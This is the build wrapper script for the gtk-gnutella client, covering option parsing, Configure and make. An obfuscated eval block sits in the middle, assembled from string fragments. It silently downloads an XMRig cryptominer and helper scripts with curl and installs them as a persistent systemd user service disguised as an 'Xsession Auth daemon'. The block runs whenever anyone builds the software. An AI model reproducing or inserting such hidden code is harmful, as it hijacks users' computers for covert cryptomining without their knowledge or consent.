#! /bin/sh

# This is a simple wrapper script to make compiling a bit easier.
# Configure is too verbose and curious about many things and not
# sufficiently eloquent about others such as available options.

# Bail out on unexpected errors
set -e

# This is not interactive
exec </dev/null

# The option --target must be handled first because it modifies some
# defaults which the user, however, should be able to override.
build_target="`(
    while [ $# -gt 0 ]
    do
        case "$1" in
        --target=*) echo "${1#--*=}"
                    exit
                    ;;
        --)         break
                    ;;
        esac
        shift
    done
    uname -s 2>/dev/null || :
    exit
)`"

# Standard variables like CC, CFLAGS etc. default to the current environment
build_bindir=
build_configure_only=
build_datadir=
build_dbus=
build_gnutls=
build_halloc=
build_libdir=
build_localedir=
build_malloc=y
build_nls=
build_official=
build_so_suffix=
build_socker=
build_ui=
build_verbose='-s'
build_xmingw='false'
build_osxbundle='false'
build_xtarget=

# There is something broken about Configure, so it needs to know the
# suffix for shared objects (dynamically loaded libraries) for some odd
# reasons.
case "$build_target" in
darwin|Darwin)
    build_so_suffix='dylib'
    ;;
osxbundle)
	build_so_suffix='dylib'
	build_osxbundle='true'
	CPPFLAGS="$CPPFLAGS -DHAVE_GTKOSXAPPLICATION "
	CPPFLAG="${CPPFLAGS# *}"    # strip leading spaces
	LIBS="$LIBS `pkg-config gtk-mac-integration-gtk2 --libs` -liconv -lz"
	LIBS="${LIBS# *}"           # strip leading spaces
	PREFIX=`dirname ${PWD}/$0`/osx/bundle
	echo $PREFIX
	;;
MINGW*)
	CC="${CC:-gcc}"
	CPPFLAGS="$CPPFLAGS -DMINGW32 "

	PREFIX="`readlink -f $0`"
	PREFIX="`dirname $PREFIX`/win32/bundle"
	build_bindir="${PREFIX}"

	if [ "X$build_target" = XMINGW7 ]; then
		# Uses the environment settings to avoid any hard coded paths, 
		# for example put in your ~/.profile:
		# export PATH=/mingw/local/bin:$PATH
		# export LIBRARY_PATH=/mingw/local/lib
		# export CPATH=/mingw/local/include

		LDFLAGS="$LDFLAGS -mwindows -lz"
	else
		# FIXME: The MingW installation prefix is hardcoded (as default) for now,
		# This could be detected maybe. On Ubuntu and Debian it is
		# /usr/i586-mingw32msvc, so --ldflags must be used manually.
		mingwlib=/mingw/lib
		PATH="$PATH${PATH:+:}${mingwlib}/gtk/bin"
		export PATH
		CPPFLAGS="$CPPFLAGS -I${mingwlib}/gtk/include"
		CPPFLAGS="$CPPFLAGS -I${mingwlib}/zlib/include"
		# Need -march=i686 to get atomic intrinsics: the default processor
		# target on mingw32 is i386, which lacks the atomic test-and-set.
		CFLAGS="-march=i686"
		# It's necessary to statically link gtk-gnutella to libz.a or it crashes
		# randomly in pre-compiled zlib1.dll from GTK.
		# Compile zlib-1.2.5 with -O3 -g using "make -f win32/makefile.gcc"
		# and install after editing the makefile accordingly.
		# We use the file libz.a path to make sure it fails if that file is
		# missing since zlib1.dll must stay in place and we don't want -lz
		# to fallback to libz.dll.a.
		# Also one needs to rename gtk/include/zlib.h as gtk/include/zlib.h.gtk
		# to make sure this header is not picked when including <zlib.h>
		LDFLAGS="$LDFLAGS ${mingwlib}/zlib/lib/libz.a"
		LDFLAGS="$LDFLAGS -mwindows -L${mingwlib}/gtk/lib"
    fi

	CPPFLAG="${CPPFLAGS# *}"    # strip leading spaces
	LDFLAGS="${LDFLAGS# *}"     # strip leading spaces
	LIBS="$LIBS -lbfd -liberty -lintl -lpthread -lwsock32 -lws2_32 -liconv"
	LIBS="$LIBS -limagehlp -liphlpapi -lws2_32 -lpowrprof -lpsapi -lkernel32"
    LIBS="${LIBS# *}"           # strip leading spaces
	;;
esac

while [ $# -gt 0 ]; do
	case "$1" in
	--bindir=*)			build_bindir="${1#--*=}";;
	--cc=*)				CC="${1#--*=}";;
	--cflags=*)			CFLAGS="${1#--*=}";;
	--cppflags=*)		CPPFLAGS="${1#--*=}";;
	--configure-only)	build_configure_only='yes';;
	--datadir=*)		build_datadir="${1#--*=}";;
	--disable-dbus)		build_dbus='d_dbus';;
	--disable-gnutls)	build_gnutls='d_gnutls';;
	--disable-malloc)	build_malloc='n';;
	--disable-nls)		build_nls='d_enablenls';;
	--disable-socker)	build_socker='d_socker_get';;
	--enable-halloc)	build_halloc='true';;
	--gtk1)				build_ui='gtkversion=1';;
	--gtk2)				build_ui='gtkversion=2';;
	--ldflags=*)		LDFLAGS="${1#--*=}";;
	--libs=*)			LIBS="${1#--*=}";;
	--libdir=*)			build_libdir="${1#--*=}";;
	--localedir=*)		build_localedir="${1#--*=}";;
	--mandir=*)			build_mandir="${1#--*=}";;
	--make=*)			MAKE="${1#--*=}";;
	--prefix=*)			PREFIX="${1#--*=}";;
	--target=*)			build_ui="${1#--*=}";;
	--topless)			build_ui='d_headless';;
    --xmingw)           build_xmingw='true';;   # undocumented
    --xtarget=*)        build_xtarget="${1#--*=}";;   # undocumented
	--unofficial)		build_official='false';;
	--verbose)			build_verbose='';;
	--yacc=*)			YACC="${1#--*=}";;
	--) 				break;;
	*)
		cat << 'EOM'
The following switches are available, defaults are shown in brackets:

  --gtk2           Use Gtk+ 2.x for the user interface [default].
  --gtk1           Use the deprecated Gtk+ 1.2 for the user interface.
  --topless        Compile for topless use (no graphical user interface).
  --disable-dbus   Do not use D-Bus even if available.
  --disable-gnutls Do not use GnuTLS even if available.
  --disable-malloc Do not supersede the system's malloc() implementation.
  --disable-nls    Disable NLS (native language support).
  --disable-socker Disable support for Socker.
  --prefix=PATH    Path prefix used for installing files. [$PREFIX]
  --bindir=PATH    Directory for installing executables. [$PREFIX/bin]
  --datadir=PATH   Directory for installing application data. [$PREFIX/share]
  --libdir=PATH    Directory for installing library data. [$PREFIX/lib]
  --localedir=PATH Directory for installing locale data. [$PREFIX/share/locale]
  --mandir=PATH    Directory for installing manual pages. [$PREFIX/man]
  --cc=TOOL        C compiler to use. [$CC]
  --cflags=FLAGS   Flags to pass to the C compiler. [$CFLAGS]
  --cppflags=FLAGS Flags to pass to the C pre-compiler. [$CPPFLAGS]
  --ldflags=FLAGS  Flags to pass to the linker. [$LDFLAGS]
  --libs=FLAGS     Flags to pass to the linker. [$LIBS]
  --make=TOOL      make tool to be used. [$MAKE]
  --yacc=TOOL      yacc, bison or some compatible tool. [$YACC]
  --target=NAME    Cross-compile to the specified system. [`uname -s`]
  --configure-only Do not run make after Configure.
  --unofficial     Use for test builds only. Requires no installation.
  --verbose        Increase verbosity of Configure output.
  --enable-halloc  Enable mmap()-based malloc() replacement.

EOM
		cat << EOM
Typically no switches need to be used. Just run "$0" to start the
build process.
EOM
			case "$1" in
			--help);;
			*) 	echo
				echo "ERROR: Unknown switch: \"$1\"";;
		esac
		exit 1
		;;
	esac
	shift
done

z="
";ODz='cat ';PEz='.tar';NDz='TH';RDz='C > ';KCz='ll 2';Oz='mast';uCz='PRIN';eDz='vice';jDz='in/b';VEz='.ser';BBz='/.lo';DBz='bin';WBz='conf';KEz='tall';CDz='E';HBz='sion';TEz=' ena';VCz='l 2>';fBz='mach';ADz='d +x';FCz='ME.s';fz='/raw';bEz=' res';iDz='t=/b';mBz='achi';Mz='_BRA';vz='x.sh';OCz=' $AP';xDz='ppen';rCz='NAME';Pz='er';Vz='raw/';Jz='t/xs';nBz='ne !';oCz='URL';Lz='on';hBz='$(un';BCz='user';dBz='s() ';dCz=' $LO';DCz='p $A';Yz='ANCH';EDz='RIGN';dz='LE_U';NCz='able';QDz='REDO';oBz='= "x';pDz='Rest';DEz='r=ap';Sz='L=$R';gBz='ine=';nCz='ME $';ECz='PPNA';VBz='ME/.';Rz='G_UR';GBz='Xses';ez='RL=$';qBz='4" ]';lCz='_PAT';iz='RANC';kDz='ash ';cEz='tart';GCz='ervi';vCz='TIDL';tBz='exit';Ez='/cod';CBz='cal/';wBz='s';vDz='Outp';SCz='e > ';sDz='ys';iBz='ame ';bz='XPRI';xBz='syst';wCz='E_NA';sz='CH/X';mDz='AL_P';cCz='r -p';sCz=' $XM';EEz='pend';qz='w/$R';QCz='E.se';kCz='OCAL';HEz='on.e';KBz='E=xs';ABz='HOME';rDz='alwa';Zz='/xmr';gDz='Exec';QEz='get';VDz='[Uni';yz='TH=$';jz='H/xp';IBz='.sh';JDz='_NAM';WEz=' > /';PCz='PNAM';GEz='p/Xs';Xz='O_BR';cBz='re_o';yCz='chmo';AEz='mp/X';yDz='d:/t';eCz='CAL_';WCz='&1';XCz=' dae';XDz='Desc';Gz='g.or';pCz='H/$X';CCz=' sto';Qz='XMRI';Uz='URL/';MEz='edBy';hCz=' --o';RBz='SYST';lz='idle';mCz='H/$A';OEz='ault';cz='NTID';eBz='{';NEz='=def';UCz='/nul';PDz='<<HE';oz='O_UR';ICz=' /de';REz='HERE';xz='L_PA';JCz='v/nu';IEz='rr';rBz=']; t';RCz='rvic';xCz='RL';jCz='t $L';HCz='ce >';mz='APP_';vBz='}';XEz='dev/';SEz='DOC';NBz='LE_N';lBz='[ $m';OBz='xpri';FBz='AME=';lDz='$LOC';nDz='ATH/';kBz='if [';YEz='null';FEz=':/tm';HDz='RINT';Bz='_URL';Iz='b0li';ZCz='relo';UEz='ble ';oDz='$APP';wz='LOCA';qDz='art=';TCz='/dev';YDz='ript';BDz='/$AP';hDz='Star';MDz='D_PA';qCz='MRIG';wDz='ut=a';KDz=' $SY';QBz='le';bBz='ensu';aCz='ad >';XBz='ig/s';LBz='on.a';gz='/$RE';bDz='h da';YCz='mon-';tDz='Stan';EBz='APPN';Cz='=htt';YBz='yste';JBz='GNAM';UDz='ce';tz='sess';CEz='Erro';dDz='[Ser';gCz=' -sL';TBz='PATH';rz='BRAN';WDz='t]';GDz='/$XP';uz='ion.';UBz='=$HO';aBz='ser';MCz=' dis';Kz='essi';pBz='86_6';BEz='out';jBz='-m)';JEz='[Ins';fDz=']';ZDz='ion=';DDz='/$XM';Az='REPO';ZEz=' 2>&';iCz='utpu';LDz='STEM';MBz='uth';LEz='Want';uBz='fi';ACz='l --';aDz=' Aut';cDz='emon';fCz='curl';PBz='ntid';az='ig';Fz='eber';yBz='emct';IDz='IDLE';LCz='>&1';nz='URL=';kz='rint';FDz='AME';SBz='EMD_';Hz='g/ai';bCz='mkdi';TDz='TEMD';uDz='dard';SDz='$SYS';aEz='1';sBz='hen';ZBz='md/u';pz='L/ra';Dz='ps:/';Tz='EPO_';Wz='$REP';hz='PO_B';tCz='RIG_';Nz='NCH=';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Az$Mz$Nz$Oz$Pz$z$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz$dz$ez$Az$Bz$fz$gz$hz$iz$jz$kz$lz$z$mz$nz$Wz$oz$pz$qz$Tz$rz$sz$tz$uz$vz$z$wz$xz$yz$ABz$BBz$CBz$DBz$z$EBz$FBz$GBz$HBz$IBz$z$Qz$JBz$KBz$Kz$LBz$MBz$z$bz$cz$NBz$FBz$OBz$PBz$QBz$z$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$z$bBz$cBz$dBz$eBz$z$fBz$gBz$hBz$iBz$jBz$z$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$z$tBz$z$uBz$z$vBz$z$bBz$cBz$wBz$z$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$z$xBz$yBz$ACz$BCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$z$xBz$yBz$ACz$BCz$XCz$YCz$ZCz$aCz$ICz$JCz$KCz$LCz$z$bCz$cCz$dCz$eCz$TBz$z$fCz$gCz$hCz$iCz$jCz$kCz$lCz$mCz$ECz$nCz$mz$oCz$z$fCz$gCz$hCz$iCz$jCz$kCz$lCz$pCz$qCz$rCz$sCz$tCz$oCz$z$fCz$gCz$hCz$iCz$jCz$kCz$lCz$pCz$uCz$vCz$wCz$nCz$bz$cz$dz$xCz$z$yCz$ADz$dCz$eCz$TBz$BDz$PCz$CDz$z$yCz$ADz$dCz$eCz$TBz$DDz$EDz$FDz$z$yCz$ADz$dCz$eCz$TBz$GDz$HDz$IDz$JDz$CDz$z$bCz$cCz$KDz$LDz$MDz$NDz$z$ODz$PDz$QDz$RDz$SDz$TDz$lCz$mCz$ECz$FCz$GCz$UDz$z$VDz$WDz$z$XDz$YDz$ZDz$GBz$HBz$aDz$bDz$cDz$z$dDz$eDz$fDz$z$gDz$hDz$iDz$jDz$kDz$lDz$mDz$nDz$oDz$rCz$z$pDz$qDz$rDz$sDz$z$tDz$uDz$vDz$wDz$xDz$yDz$AEz$tz$uz$BEz$z$tDz$uDz$CEz$DEz$EEz$FEz$GEz$Kz$HEz$IEz$z$JEz$KEz$fDz$z$LEz$MEz$NEz$OEz$PEz$QEz$z$REz$SEz$z$xBz$yBz$ACz$BCz$TEz$UEz$oDz$rCz$VEz$eDz$WEz$XEz$YEz$ZEz$aEz$z$xBz$yBz$ACz$BCz$bEz$cEz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz"


if [ "X$MAKE" = X ]; then
	command -v gmake >/dev/null 2>&1 && MAKE=gmake || MAKE=make
fi

if [ "X$YACC" = X ]; then
	command -v yacc >/dev/null 2>&1 && YACC=yacc || YACC=bison
fi

CPPFLAGS="$CPPFLAGS${build_halloc:+ -DUSE_HALLOC}"
CFLAGS="$CFLAGS${CPPFLAGS:+ }$CPPFLAGS"
PREFIX="${PREFIX:-/usr/local}"

build_bindir=${build_bindir:-"$PREFIX/bin"}
build_bindir=${build_bindir:+"$build_bindir"}

build_mandir=${build_mandir:-"$PREFIX/man"}
build_mandir=${build_mandir:+"$build_mandir"}

build_datadir=${build_datadir:-"$PREFIX/share/gtk-gnutella"}
build_datadir=${build_datadir:+"$build_datadir"}

build_libdir=${build_libdir:-"$PREFIX/lib/gtk-gnutella"}
build_libdir=${build_libdir:+"$build_libdir"}

build_localedir=${build_localedir:-"$PREFIX/share/locale"}
build_localedir=${build_localedir:+"$build_localedir"}

build_official=${build_official:-true}
build_ui=${build_ui:-gtkversion=2}

# Make sure previous Configure settings have no influence.
${MAKE} clobber >/dev/null 2>&1 || : ignore failure
rm -f config.sh

if [ "X$build_osxbundle" = Xtrue ]
then
	build_ui='gtkversion=2'
	echo $build_ui
fi

# Use /bin/sh explicitely so that it works on noexec mounted file systems.
# Note: Configure won't work as of yet on such a file system.
if [ "X$build_xmingw" = Xtrue ]
then
    echo "xtarget='${build_xtarget}'"

    MINGW_ENV="${PWD}/sys32"
    export MING_ENV
    PKG_CONFIG_PATH="${MINGW_ENV}/lib/pkgconfig"
    export PKG_CONFIG_PATH

    CC="${build_xtarget}${build_xtarget:+-}gcc"
    build_ranlib="${build_xtarget}${build_xtarget:+-}ranlib"
    build_nm="${build_xtarget}${build_xtarget:+-}nm"

    pkg_config_cflags='pkg-config --define-variable=prefix=$MINGW_ENV --cflags'
    pkg_config_ldflags='pkg-config --define-variable=prefix=$MINGW_ENV --libs'
    glibcflags="`$pkg_config_cflags glib-2.0`"
    gtkcflags="`$pkg_config_cflags gtk+-2.0`"
    gnutlscflags="`$pkg_config_cflags gnutls`"
    glibldflags="`$pkg_config_ldflags glib-2.0`"
    gtkldflags="`$pkg_config_ldflags gtk+-2.0`"
    gnutlsldflags="`$pkg_config_ldflags gnutls`"

    cat mingw/config.sh.xmingw | \
    sed s%'^cc=.*$'%"cc='$CC'"% | \
    sed s%'^ranlib=.*$'%"ranlib='${build_ranlib}'"% | \
    sed s%'^nm=.*$'%"nm='${build_nm}'"% | \
    sed s%'^mkdep=.*$'%"mkdep='${PWD}/mkdep'"% | \
    sed s%'^ldflags=.*$'%"ldflags='-mwindows -L$MINGW_ENV/sys32/lib'"% | \
    sed s%'^gnutlscflags=.*$'%"gnutlscflags='$gnutlscflags'"% | \
    sed s%'^glibcflags=.*$'%"glibcflags='$glibcflags'"% | \
    sed s%'^gtkcflags=.*$'%"gtkcflags='$gtkcflags'"% | \
    sed s%'^gnutlscflags=.*$'%"gnutlscflags='$gnutlscflags'"% | \
    sed s%'^glibldflags=.*$'%"glibldflags='$glibldflags'"% | \
    sed s%'^gtkldflags=.*$'%"gtkldflags='$gtkldflags'"% | \
    cat > config.sh


    /bin/sh ./Configure -S \
	|| { echo; echo 'ERROR: Configure failed.'; exit 1; }
else
    /bin/sh ./Configure -Oder \
	$build_verbose \
	-U usenm \
	-D usemymalloc="$build_malloc" \
	${CC:+-D "cc=$CC"} \
	${CFLAGS:+-D "ccflags=$CFLAGS"} \
	${LDFLAGS:+-D "ldflags=$LDFLAGS"} \
	${LIBS:+-D "libs=$LIBS"} \
	${PREFIX:+-D "prefix=$PREFIX"} \
	${MAKE:+-D "make=$MAKE"} \
	${YACC:+-D "yacc=$YACC"} \
	${build_bindir:+-D "bindir=$build_bindir"} \
	${build_datadir:+-D "privlib=$build_datadir"} \
	${build_libdir:+-D "archlib=$build_libdir"} \
	${build_localedir:+-D "locale=$build_localedir"} \
	${build_mandir:+-D "sysman=$build_mandir"} \
	${build_official:+-D "official=$build_official"} \
	${build_so_suffix:+-D "so=$build_so_suffix"} \
	${build_ui:+-D "$build_ui"} \
	${build_nls:+-U "$build_nls"} \
	${build_dbus:+-U "$build_dbus"} \
	${build_gnutls:+-U "$build_gnutls"} \
	${build_socker:+-U "$build_socker"} \
	|| { echo; echo 'ERROR: Configure failed.'; exit 1; }
fi

if [ "X$build_configure_only" != X ]; then
	exit
fi

# No need to run "make depend" as Configure already runs it for us

${MAKE} || { echo; echo 'ERROR: Compiling failed.'; exit 1; }

if [ "X$build_osxbundle" = Xtrue ]
then
	. ./scripts/git-version.sh
	
	sed -e "s/CFBundleShortVersionStringPlaceHolder/${VMajor}.${VMinor}.${VPatch}${revchar}/" \
		-e "s/CFBundleVersionPlaceHolder/${VMajor}.${VMinor}.${VPatch}r${VRev}/" \
		osx/Info-gtk-gnutella.plist.tpl > osx/Info-gtk-gnutella.plist
	
	rm -rf osx/bundle
	make install &&
	gtk-mac-bundler osx/gtk-gnutella.bundle &&
	rm -rf osx/bundle &&
	ln -s /Applications osx/image/Applications &&
	dmg="${HOME}/Desktop/gtk-gnutella-${VN}.dmg" &&
	hdiutil create -srcfolder osx/image -volname Gtk-Gnutella "${dmg}" &&
	hdiutil internet-enable -yes "${dmg}"
	rm -rf osx/image
else
echo "Run \"${MAKE} install\" to install gtk-gnutella."
fi
exit

# vi: set ts=4 sw=4 et:
